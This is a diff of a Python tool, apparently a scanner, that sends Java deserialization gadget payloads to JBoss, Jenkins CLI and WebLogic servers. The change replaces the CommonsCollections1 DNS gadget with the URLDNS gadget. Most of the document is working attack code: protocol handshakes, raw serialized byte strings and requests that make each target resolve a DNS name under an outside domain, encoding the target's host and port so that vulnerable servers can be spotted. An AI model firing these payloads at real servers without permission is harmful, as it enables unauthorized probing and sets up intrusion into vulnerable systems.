@@ -1,9 +1,10 @@
-import requests
-import sys
 from sys import argv
+from binascii import hexlify
+
 import getopt
 import argparse
-from binascii import hexlify
+import requests
+import sys
 import struct
 import random
 import socket
@@ -55,29 +56,43 @@ def scanning_host(host,port,dns_suffix):
     except (socket.error , requests.exceptions.ConnectionError) as err:
         print(" /!\\ Unable to connect to host %s on port %s " % (host, port))
 
-def build_gadget(value, file):
+def build_gadget(file, replacements):
     """
     It read the gadget file and replace the place holder "\x04AAAA" with the value specify
     """
     with open(file,"rb") as file:
         gadget_bytes = file.read()
-        new_value = (struct.pack(">B",len(value))+value)
-        payload = gadget_bytes.replace("\x04AAAA",new_value)
-        #print payload
-        return payload
+
+        #Ugly fix for Python 2.7
+        #Python 3 would require open(..., newline="")
+        gadget_bytes= gadget_bytes.replace("\x0d\x0a","\x0a")
+
+        #Replace the placeholder by new values
+        for key, value in replacements.iteritems():
+            new_value = (struct.pack(">B",len(value))+value)
+            gadget_bytes = gadget_bytes.replace(key,new_value)
+
+        return gadget_bytes
 
 def buildDnsGadgetCC1(dns_host):
     """
     Build a payload using CommonsCollections gadget with a DNS twist
     """
-    return build_gadget(dns_host, "gadgets/CommonsCollections1Dns")
+    return build_gadget("gadgets/CommonsCollections1Dns", {"\x04AAAA":dns_host})
+
+def buildDnsGadgetUrlDns(dns_host):
+    """
+    Build a payload using a minimal payload by Gabriel Lawrence
+    https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
+    """
+    return build_gadget("gadgets/UrlDns", {"\x04AAAA":dns_host,"\x0bhttp://AAAA":"http://"+dns_host})
 
 def send_payload_jboss(host,port,dns_suffix):
     """
     Inspired from: http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
     """
 
-    rawBody = buildDnsGadgetCC1(hexlify(str(random.randint(10, 999))+":jboss:"+host+":"+port)+"."+dns_suffix)
+    rawBody = buildDnsGadgetUrlDns(hexlify(str(random.randint(10, 999))+":jboss:"+host+":"+port)+"."+dns_suffix)
     headers = {"User-Agent":"BreakFastSerial"}
     response = requests.post("http://"+host+":"+port+"/invoker/JMXInvokerServlet", data=rawBody, headers=headers)
 
@@ -115,7 +130,7 @@ def send_payload_jenkins_cli(host,port,dns_suffix):
     data = sock.recv(1024)
     data = sock.recv(1024)
 
-    payloadObj = buildDnsGadgetCC1(hexlify(str(random.randint(10, 999))+":jenkins-cli:"+host+":"+port)+"."+dns_suffix)
+    payloadObj = buildDnsGadgetUrlDns(hexlify(str(random.randint(10, 999))+":jenkins-cli:"+host+":"+port)+"."+dns_suffix)
 
     payload_b64 = base64.b64encode(payloadObj)
     payload =  "\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e"
@@ -144,7 +159,7 @@ def send_payload_weblogic(host,port,dns_suffix):
     data = sock.recv(1024)
     #print'[*] Received: "{}"'.format(data)
 
-    payloadObj = buildDnsGadgetCC1(hexlify(str(random.randint(10, 999))+":weblogic:"+host+":"+port)+"."+dns_suffix)
+    payloadObj = buildDnsGadgetUrlDns(hexlify(str(random.randint(10, 999))+":weblogic:"+host+":"+port)+"."+dns_suffix)
 
     payload = '\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'
     payload += payloadObj
